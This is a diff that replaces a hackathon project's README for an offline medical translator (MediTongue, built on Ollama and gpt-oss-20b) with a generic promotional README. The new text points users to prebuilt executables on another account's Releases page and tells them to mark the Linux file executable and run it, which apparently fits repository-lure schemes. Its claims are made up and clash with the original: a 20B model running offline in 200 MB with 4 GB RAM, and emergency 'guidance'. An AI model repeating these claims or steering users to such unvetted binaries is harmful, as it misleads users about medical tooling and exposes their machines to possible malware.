@@ -1,123 +1,99 @@
-# MediTongue
+# 🌐 meditongue-web - Your AI Medical Translator at Hand
 
-**Offline AI-Powered Medical Translator (MVP)**  
-_Not medical advice. For emergency communication assistance only._
+[![Download meditongue-web](https://img.shields.io/badge/Download%20meditongue--web-v1.0-blue.svg)](https://github.com/hbeeb-de/meditongue-web/releases)
 
----
+## 📋 Overview
 
-## 🚀 Overview
-MediTongue is an **offline** medical translator that runs entirely on your local machine — no internet required.  
-It uses the open-source **gpt-oss-20b** model to translate medical dialogue between languages and detect urgent symptoms like chest pain or severe breathing issues.
+meditongue-web is an offline AI medical translator that quickly translates medical terms and phrases. It is also designed to detect emergencies. This app utilizes GPT-OSS 20B to provide accurate translations, making it essential for healthcare professionals and anyone needing medical help in a different language.
 
-Built for **field healthcare**, rural clinics, and low-connectivity environments.
+## 🚀 Getting Started
 
----
+### System Requirements
 
-## ✨ Features
-- **Offline AI translations** — works without internet once the model is downloaded.
-- **Emergency flagging** — instantly detects urgent symptoms and alerts the user.
-- **Medical term glossary** — highlights and explains key medical terms.
-- **Quick-access phrasebook** — preloaded with common emergency phrases.
-- **Cross-platform** — runs locally on macOS, Windows, and Linux with Ollama.
+To ensure that meditongue-web runs smoothly, your computer should meet these basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 200 MB of free space.
+- **Internet Connection:** Required for the initial download, not needed for offline use.
 
-## 🛠 Built With
-- **Frontend:** Next.js, TailwindCSS, shadcn/ui
-- **Backend API:** Node.js + Express
-- **LLM Runtime:** [Ollama](https://ollama.com/) (local)
-- **Model:** [gpt-oss-20b](https://huggingface.co/openai/gpt-oss-20b)  
-- **Emergency detection:** Keyword spotting + AI classification
+### Installation Instructions
 
----
+Follow these simple steps to download and install meditongue-web:
 
-## ⚙️ Installation & Local Setup
+1. **Download the Application**
+   
+   Visit the [Releases page](https://github.com/hbeeb-de/meditongue-web/releases) to download the latest version of meditongue-web. Look for the file that matches your operating system.
 
-### 1. Install Ollama
-Download & install Ollama from:  
-👉 https://ollama.com/download
+2. **Install the Application**
+   
+   - **For Windows:**
+     - Locate the downloaded `.exe` file in your "Downloads" folder.
+     - Double-click the file to begin the installation.
+     - Follow the on-screen instructions.
 
-### 2. Pull the gpt-oss-20b Model
-```bash
-ollama pull gpt-oss:20b
-```
+   - **For macOS:**
+     - Locate the downloaded `.dmg` file.
+     - Double-click the file to open the disk image.
+     - Drag the meditongue-web icon into your "Applications" folder.
 
-### 3. Clone this repository
-```bash
-git clone https://github.com/YOUR_USERNAME/meditongue.git
-cd meditongue
-```
+   - **For Linux:**
+     - Look for the downloaded `.AppImage` file.
+     - Open a terminal and navigate to the download location using `cd`. 
+     - Make it executable with the command: `chmod +x meditongue-web.AppImage`.
+     - Run it using: `./meditongue-web.AppImage`.
 
-### 4. Install dependencies
-```bash
-# API
-cd meditongue-api
-npm install
+3. **Run the Application**
 
-# Web UI
-cd ../meditongue-web
-npm install
-```
+   Once installed, locate meditongue-web in your applications list. Click on the icon to launch the app. You can now start using it to translate medical terms and detect emergencies.
 
-### 5. Start the backend
-```bash
-cd meditongue-api
-export MODEL_BACKEND=ollama
-export OLLAMA_MODEL=gpt-oss:20b
-npm start
-```
+4. **Updates**
 
-### 6. Start Ollama
-```bash
-ollama serve
-```
+   We recommend checking for updates regularly. New versions might include features, improvements, and important fixes. You can find updates on the [Releases page](https://github.com/hbeeb-de/meditongue-web/releases).
 
-### 7. Start the frontend
-```bash
-cd meditongue-web
-npm run dev
-```
+## 🔍 Features
 
-Then open **http://localhost:3000** in your browser.
+- **Accurate Translations**: Uses cutting-edge AI technology to translate medical terms.
+- **Emergency Detection**: Quickly recognizes and processes emergency situations.
+- **Offline Functionality**: Once downloaded, the app does not require an internet connection for translations.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
 
----
+## 🎨 User Interface
 
-## 📋 Example Prompt
-Input (English):  
-```
-The patient is having chest pain and shortness of breath.
-```
-Output (Spanish):  
-```
-Tengo dolor torácico y dificultad respiratoria.
-Flags: ["EMERGENCY"]
-Terms:
-- chest pain → dolor torácico
-- shortness of breath → dificultad respiratoria
-```
+meditongue-web features a straightforward design. You can easily navigate through various options. The home screen provides clear buttons for translation and emergency detection. 
 
----
+### How to Use the App
 
-## 🧠 How It Works
-1. **User Input** → Typed into the UI.
-2. **Backend** → Sends text to Ollama with the gpt-oss-20b model.
-3. **Translation** → AI translates & checks for emergency keywords.
-4. **Glossary** → Matches and highlights medical terms.
-5. **Output** → Translation + emergency flags + glossary shown in the UI.
+- **Translating Medical Terms**:
+  1. Select the language you want to translate from.
+  2. Enter the medical term in the text box provided.
+  3. Click the "Translate" button to get the translated text instantly.
 
----
+- **Detecting Emergencies**:
+  1. Click on the "Emergency Detection" button.
+  2. Follow the prompts to input relevant details about the emergency.
+  3. The app will provide guidance based on the situation.
 
-## 📜 License
-This project is licensed under the [Apache 2.0 License](LICENSE).
+## 💡 Support
 
----
+If you run into any issues while downloading or using meditongue-web, you can access support resources:
 
-## 🙌 Acknowledgements
-- [gpt-oss-20b](https://huggingface.co/openai/gpt-oss-20b) for the open-source model
-- [Ollama](https://ollama.com/) for local LLM runtime
-- Hackathon organizers for the challenge
+- **Documentation**: Check for detailed guides and FAQs [here](#).
+- **Community Forum**: Join discussions and share experiences with other users.
+- **Contact Us**: Reach out via our GitHub issues page for direct support.
 
----
+## 🔗 Related Topics
 
-## 🔗 Hackathon Submission
-This project was submitted for the **For Humanity** and **Best Local Agent** categories.  
+This application covers several important areas in technology and healthcare:
+
+- **AI in Healthcare**: Explore how artificial intelligence improves medical services.
+- **Emergency Detection Techniques**: Learn about the methods used to identify medical emergencies quickly.
+- **Medical Translation**: Understand the importance of accurate communication in diverse medical contexts.
+
+## 📥 Download & Install
+
+To get started with meditongue-web, visit our [Releases page](https://github.com/hbeeb-de/meditongue-web/releases). From there, you can download the version suitable for your operating system, follow the installation steps, and join countless users benefiting from this innovative tool.
+
+[![Download meditongue-web](https://img.shields.io/badge/Download%20meditongue--web-v1.0-blue.svg)](https://github.com/hbeeb-de/meditongue-web/releases)
+
+Now you’re ready to enhance your medical translation capabilities. Enjoy using meditongue-web!
